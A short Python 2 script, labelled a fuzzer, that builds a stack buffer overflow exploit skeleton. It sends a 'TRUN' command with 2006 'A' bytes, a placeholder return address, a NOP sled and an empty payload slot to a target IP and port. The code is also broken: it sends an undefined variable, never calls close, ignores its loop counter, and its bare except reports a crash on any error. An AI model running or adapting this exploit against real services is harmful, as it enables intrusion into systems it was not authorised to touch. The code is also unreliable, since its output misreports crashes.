#Fuzzer

import socket, sys

eip = "\x00\x00\x00\x00"  #\x00 is used for creating Hex code
nopsled=  "\x90" * 24
payload= "";
ip = sys.argv[1]
port = int(sys.argv[2])

try:
		for badstrlen in xrange(1,3000):
			conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			conn.settimeout(2)
			conn.connect((ip, port))
			conn.recv(1024) #grab banner
			print "Trying string of length %i" %badstrlen
			badbuff = "A" *2006 + eip + nopsled + payload
			badcmd = "TRUN  ."  + badbuf + "\r\n"
			conn.send(badcmd)
			conn.recv(1024)  #Crash happens here
			conn.close
except:
	print "***********************************"
	print "RUH-ROH -- CRASH!!!!"
	print "***********************************"